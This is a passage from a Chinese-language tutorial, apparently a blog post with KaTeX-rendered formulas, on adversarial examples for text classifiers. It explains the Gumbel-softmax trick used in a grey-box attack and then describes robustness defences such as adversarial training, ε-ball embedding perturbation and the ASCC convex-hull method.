    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3361em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>，之后将<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         − 
        
       
         l 
        
       
         o 
        
       
         g 
        
       
         ( 
        
       
         − 
        
       
         l 
        
       
         o 
        
       
         g 
        
       
           
        
        
        
          ε 
         
        
          i 
         
        
       
         ) 
        
       
      
        -log(-log \ \varepsilon_i) 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>加到<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         l 
        
       
         o 
        
        
        
          g 
         
         
         
           p 
          
         
           i 
          
         
        
       
      
        log_{p_i} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.9805em; vertical-align: -0.2861em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3281em;"><span class="" style="top: -2.357em; margin-left: 0em; margin-right: 0.0714em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em;"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span></span></span></span></span>中去，最后把最大值对应的类别抽取出来就行了。</p> 
<p>可以证明，按照Gumble Max过程精确的等价于议概率<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          p 
         
        
          1 
         
        
       
         , 
        
        
        
          p 
         
        
          2 
         
        
       
         , 
        
       
         . 
        
       
         . 
        
       
         . 
        
        
        
          p 
         
        
          k 
         
        
       
      
        p_1, p_2, ...p_k 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3361em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>采样一个类别。也就是说，在Gumbel Max中，输出的i的概率就是<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          p 
         
        
          i 
         
        
       
      
        p_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>。</p> 
<p>但是，Gumbel Max仍然是一个argmax过程，仍然不可导，因此提出了Gumnel softmax来对Gumbel Max进行近似来满足可到的条件。</p> 
<h6><a id="3542_Gumbelsoftmax_reparameterization_trick_using_softmax_with_temperature_scaling_as_appriximation_of_argmax_630"></a>3.5.4.2. Gumbel-softmax reparameterization trick: using softmax with temperature scaling as appriximation of argmax</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/2d/c8/Q0EcBFUr_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>在神经网络中，处理离散输入的基本方法是将其转换为one-hot编码，包括embedding层本质也是one-hot的全连接。argmax本质上是one-hot(arg max)，为了使其可导，就需寻找对one-hot的光滑近似。Gumbel Softmax就是one-hot的光滑近似。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          s 
         
        
          o 
         
        
          f 
         
        
          t 
         
        
          m 
         
        
          a 
         
        
          x 
         
        
          ( 
         
        
          ( 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
            
         
         
         
           p 
          
         
           i 
          
         
        
          − 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
          ( 
         
        
          − 
         
        
          l 
         
        
          o 
         
        
          g 
         
         
         
           ε 
          
         
           i 
          
         
        
          ) 
         
        
          ) 
         
        
          / 
         
        
          τ 
         
         
         
           ) 
          
          
          
            i 
           
          
            = 
           
          
            1 
           
          
         
           k 
          
         
        
          , 
         
         
         
           ε 
          
         
           i 
          
         
        
          ∼ 
         
        
          U 
         
        
          [ 
         
        
          0 
         
        
          , 
         
        
          1 
         
        
          ] 
         
        
       
         softmax(( log \ p_i-log(-log \varepsilon_i )) / \tau )^k_{i=1}, \varepsilon _i\sim U[0,1] 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right: 0.1076em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">((</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 1.1491em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">))</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right: 0.1132em;">τ</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8991em;"><span class="" style="top: -2.453em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.109em;">U</span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span></span><br> 其中参数，<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         τ 
        
       
         &gt; 
        
       
         0 
        
       
      
        \tau &gt; 0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5782em; vertical-align: -0.0391em;"></span><span class="mord mathnormal" style="margin-right: 0.1132em;">τ</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.6444em;"></span><span class="mord">0</span></span></span></span></span>称为退火参数，越小输出结果就越接近ont-hot形式（但同时梯度消失严重），越大结果越接近均匀分布。</p> 
<h6><a id="3543_The_gradient_of_the_text_classifier_can_backprop_through_the_auto_encoder_643"></a>3.5.4.3. The gradient of the text classifier can backprop through the auto encoder</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/d0/91/a6Muvybq_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>通过Gumbel Softmax将不可求导的离散的one-hot形式的argmax变成了连续的光滑的argmax形式，这就保证了adversarial sample的训练优化。</p> 
<blockquote> 
 <p>Xu, Ying, et al. "Grey-box Adversarial Attack And DefenceFor Sentiment Classification."<em>Proceedings of the 2021 Conference of the North American Chapter of the Association for Computational Linguistics: Human Language Technologies.</em> 2021.</p> 
</blockquote> 
<h3><a id="4_Defenses_against_Evasion_Attacks_654"></a>4. Defenses against Evasion Attacks</h3> 
<h4><a id="41_Training_a_More_Robust_Model_656"></a>4.1. Training a More Robust Model</h4> 
<h5><a id="411_Adversarial_training_generate_the_adversarial_samples_using_the_current_model_every_N_epochs_658"></a>4.1.1. Adversarial training: generate the adversarial samples using the current model every N epochs</h5> 
<p><img src="https://images2.imgbox.com/70/47/SYgUhsO8_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>该方法是最符合直觉的做法：</p> 
<p>step1: 选定一初始训练集，对Text Classifier进行N轮epochs的训练，得到训练模型</p> 
<p>step2: 选定一个Attack Algorithm对初始训练集进行处理，生成adversarial samples，之后adversarial samples加上输出训练集对Text classifier再进行N轮epochs的训练，得到一个相对robust的模型</p> 
<p>step3: 重复1、2直到达到要求为止。</p> 
<p>这种方法最符合直觉，但是在生成adversarial samples的时候及其消耗时间，因此不是一个常用的算法。</p> 
<h5><a id="412_Adversatrial_training_in_the_word_embedding_space_by_varepsilonball__%09_____Motivation_A_words_synonym_may_be_within_its_neigkborhood_673"></a>4.1.2. Adversatrial training in the word embedding space by <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>-ball. Motivation: A word’s synonym may be within its neigkborhood</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/70/d5/6uRrLYi5_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，有点类似于NLP的基于梯度的白盒攻击。</p> 
<p>step1: 获得模型在当前sentence（<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
         , 
        
        
        
          e 
         
        
          1 
         
        
       
         , 
        
       
         . 
        
       
         . 
        
       
         . 
        
       
         , 
        
        
        
          e 
         
        
          k 
         
        
       
      
        {e_0, e_1, ..., e_k} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3361em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></span>）中训练得到Loss。</p> 
<p>step1: 设定一个超参数<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>，在word embedding space中以当前单词<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          i 
         
        
       
      
        e_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>为半径划定一个半径为<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>的球体。认为：在球体内的word embedding代表的单词为<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          i 
         
        
       
      
        e_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>的近义词。</p> 
<p>step3：计算Loss与sentence中各个单词的embedding（以<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>为例）与在球体中其他embedding（<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          v 
         
        
          i 
         
        
       
      
        v_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>）的和的偏导。求得使偏导最大的embedding（<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          v 
         
        
          ∗ 
         
        
       
      
        v^* 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>）代表的单词。</p> 
<p>step4：将<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          v 
         
        
          ∗ 
         
        
       
      
        v^* 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6887em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6887em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>代表的单词替换sentence中原有的单词。</p> 
<p>step5: 重复step3，直到所有单词都被替换，这时生成了一个新的adversarial sample。</p> 
<p>step6: 将新生成的sentence放入Text Classifier中进行训练，得到一个更robust的模型。</p> 
<p>该方法通过对原有sentence添加扰动，加强了模型的泛化能力。（类似于CV领域的添加噪声）</p> 
<h5><a id="413_ASCCdefense_Adversarial_Sparse_Convex_Combination_696"></a>4.1.3. ASCC-defense (Adversarial Sparse Convex Combination):</h5> 
<h6><a id="4131_Convex_hull_of_set_A_the_smallest_convex_containing_A_Adversarial_training_in_the_word_embedding_space_by_the_convex_hull_form_by_the_synonym_set_698"></a>4.1.3.1. Convex hull of set A: the smallest convex containing A. Adversarial training in the word embedding space by the convex hull form by the synonym set.</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/3e/61/9qQuIA5c_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>假设黑点为当前被替换的单词的embdding，四个红点为最理想的被替换的同义embedding。</p> 
<p>右面两图显示，当候选区域为球体时，<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>的大小会严重影响候选embedding的选择，若过小，则对sentence的扰动不够；若过大，则会添加一些不合理的扰动，甚至影响模型的性能。候选区域为矩形也一样。</p> 
<p>这时，考虑计算一个embedding的凸集，该凸集可以很好的包括尽可能多的候选embedding，同时也可以防止包含不好的embedding，如左图。</p> 
<p>选择凸集而不是凹集是为了计算上的方便。</p> 
<h6><a id="4132_The_convex_hull_of_a_set_A_can_be_represented_by_the_linear_combination_of_the_elements_in_set_A_713"></a>4.1.3.2. The convex hull of a set A can be represented by the linear combination of the elements in set A</h6> 
<p><strong>Proposition 1.</strong> <em>Let $\mathbb{S}(u)= {\mathbb{S}(u)_1, \mathbb{S}(u)_2, …, \mathbb{S}(u)_T } $ be the set of all substitutions of word <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          u 
         
        
       
         u 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span></span>, <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          c 
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          S 
         
        
          ( 
         
        
          u 
         
        
          ) 
         
        
       
         conv\mathbb{S}(u) 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">co</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathbb">S</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span></span> be the convex hull of word vectors of all elements in <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          S 
         
        
          ( 
         
        
          u 
         
        
          ) 
         
        
       
         \mathbb{S}(u) 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathbb">S</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span></span>, and <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          v 
         
        
          ( 
         
        
          . 
         
        
          ) 
         
        
       
         v( .) 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mopen">(</span><span class="mord">.</span><span class="mclose">)</span></span></span></span></span> be the word vector function. Then, we have <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          c 
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          S 
         
        
          ( 
         
        
          u 
         
        
          ) 
         
        
          = 
         
        
          { 
         
         
         
           ∑ 
          
          
          
            i 
           
          
            = 
           
          
            1 
           
          
         
           T 
          
         
         
         
           w 
          
         
           i 
          
         
        
          v 
         
        
          ( 
         
        
          S 
         
        
          ( 
         
        
          u 
         
         
         
           ) 
          
         
           i 
          
         
        
          ) 
         
        
          ∣ 
         
         
         
           ∑ 
          
          
          
            i 
           
          
            = 
           
          
            1 
           
          
         
           T 
          
         
         
         
           w 
          
         
           i 
          
         
        
          = 
         
        
          1 
         
        
          , 
         
        
            
         
         
         
           w 
          
         
           i 
          
         
        
          &gt; 
         
        
          = 
         
        
          0 
         
        
          } 
         
        
       
         conv\mathbb{S}(u) = \{ \sum^T_{i=1} w_iv(\mathbb{S}(u)_i) | \sum^T_{i=1} w_i=1, \ w_i &gt;= 0 \} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">co</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathbb">S</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1.2809em; vertical-align: -0.2997em;"></span><span class="mopen">{<!-- --></span><span class="mop"><span class="mop op-symbol small-op" style="position: relative; top: 0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.9812em;"><span class="" style="top: -2.4003em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.2029em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2997em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 